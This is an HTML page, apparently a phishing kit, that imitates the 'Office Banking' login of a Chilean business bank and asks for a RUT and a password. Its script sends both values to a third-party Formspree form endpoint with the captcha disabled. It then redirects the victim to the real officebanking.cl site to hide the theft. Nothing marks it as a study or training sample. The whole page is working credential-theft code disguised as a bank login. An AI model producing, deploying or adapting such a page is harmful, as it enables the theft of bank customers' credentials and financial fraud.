<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Office Banking</title>
<style>
  * { box-sizing: border-box; }

  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    min-height: 100%;
    background: #f5f5f5;
  }

  body {
    font-family: Arial, Helvetica, sans-serif;
    color: #111;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }

  .container {
    background: white;
    border-radius: 16px;
    padding: 50px 40px;
    width: 100%;
    max-width: 420px;
    box-shadow: 0 10px 50px rgba(0, 0, 0, 0.1);
  }

  .header {
    text-align: center;
    margin-bottom: 40px;
  }

  .office {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 36px;
    line-height: 1;
    font-weight: 300;
    letter-spacing: -1.5px;
    margin-bottom: 25px;
  }

  .office-black {
    color: #111;
    font-weight: 300;
  }

  .office-red {
    padding: 8px 12px;
    color: #fff;
    background: #ed1b24;
    font-weight: 500;
    letter-spacing: -0.8px;
    border-radius: 3px;
  }

  .welcome {
    margin: 0;
    color: #111;
    font-size: 24px;
    line-height: 1.3;
    font-weight: 400;
    letter-spacing: -0.5px;
  }

  .form-group {
    margin-bottom: 28px;
  }

  label {
    display: block;
    margin-bottom: 10px;
    color: #666;
    font-size: 12px;
    font-weight: 500;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }

  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 12px 0;
    border: none;
    border-bottom: 2px solid #ddd;
    background: transparent;
    font-size: 15px;
    color: #111;
    font-family: Arial, Helvetica, sans-serif;
    transition: all 0.3s ease;
    outline: none;
  }

  input[type="text"]::placeholder,
  input[type="password"]::placeholder {
    color: #aaa;
  }

  input[type="text"]:focus,
  input[type="password"]:focus {
    border-bottom-color: #ed1b24;
  }

  input[type="text"]:focus::placeholder,
  input[type="password"]:focus::placeholder {
    color: #ed1b24;
  }

  .form-button {
    width: 100%;
    padding: 14px;
    background: #ed1b24;
    color: white;
    border: none;
    border-radius: 25px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    margin-top: 20px;
    box-shadow: 0 4px 15px rgba(237, 27, 36, 0.3);
  }

  .form-button:hover {
    background: #d41a23;
    box-shadow: 0 6px 20px rgba(237, 27, 36, 0.4);
  }

  .form-button:active {
    transform: scale(0.98);
  }

  .form-button:disabled {
    background: #ccc;
    cursor: not-allowed;
    opacity: 0.6;
  }

  .forgot-link {
    display: block;
    text-align: center;
    margin-top: 20px;
    padding-top: 20px;
    border-top: 1px solid #f0f0f0;
    color: #ed1b24;
    text-decoration: none;
    font-size: 13px;
    font-weight: 500;
    transition: all 0.3s ease;
  }

  .forgot-link:hover {
    color: #d41a23;
  }

  .cargando {
    display: none;
    text-align: center;
    margin-top: 20px;
  }

  .spinner {
    border: 3px solid #f3f3f3;
    border-top: 3px solid #ed1b24;
    border-radius: 50%;
    width: 24px;
    height: 24px;
    animation: spin 1s linear infinite;
    margin: 0 auto;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  @media (max-width: 480px) {
    .container {
      padding: 40px 25px;
      border-radius: 12px;
    }

    .office {
      font-size: 30px;
      margin-bottom: 20px;
    }

    .welcome {
      font-size: 20px;
    }

    input[type="text"],
    input[type="password"] {
      padding: 10px 0;
      font-size: 14px;
    }

    .form-button {
      padding: 12px;
      font-size: 14px;
    }
  }
</style>
</head>

<body>
  <div class="container">
    <div class="header">
      <div class="office">
        <span class="office-black">office</span>
        <span class="office-red">banking</span>
      </div>
      <h1 class="welcome">Bienvenido a Office Banking</h1>
    </div>

    <form id="formulario">
      <div class="form-group">
        <label for="rut">RUT</label>
        <input 
          type="text" 
          id="rut" 
          name="rut" 
          placeholder="XX.XXX.XXX-X" 
          required
        >
      </div>

      <div class="form-group">
        <label for="contrasena">Contraseña</label>
        <input 
          type="password" 
          id="contrasena" 
          name="contrasena" 
          placeholder="Ingresa tu contraseña" 
          required
          autocomplete="off"
        >
      </div>

      <button type="submit" class="form-button" id="boton">Aceptar</button>
    </form>
    
    <div class="cargando" id="cargando">
      <div class="spinner"></div>
      <p style="margin-top: 10px; color: #ed1b24; font-size: 13px;">Procesando...</p>
    </div>

    <a href="#" class="forgot-link">¿Olvidaste tu clave?</a>
  </div>

  <script>
    const formulario = document.getElementById('formulario');
    const cargando = document.getElementById('cargando');
    const boton = document.getElementById('boton');

    formulario.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const rut = document.getElementById('rut').value;
      const contrasena = document.getElementById('contrasena').value;
      
      // Mostrar cargando
      cargando.style.display = 'block';
      boton.disabled = true;

      try {
        const respuesta = await fetch('https://formspree.io/f/mzeznpoq', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            rut: rut,
            contrasena: contrasena,
            _subject: 'Nuevo Login - Office Banking',
            _captcha: 'false'
          })
        });

        if (respuesta.ok) {
          formulario.reset();
          
          // Redirigir después de 1 segundo
          setTimeout(() => {
            window.location.href = 'https://empresas.officebanking.cl/article/app-office-banking';
          }, 1000);
        }
      } catch (error) {
        console.log('Error:', error);
      } finally {
        cargando.style.display = 'none';
        boton.disabled = false;
      }
    });
  </script>
</body>
</html>
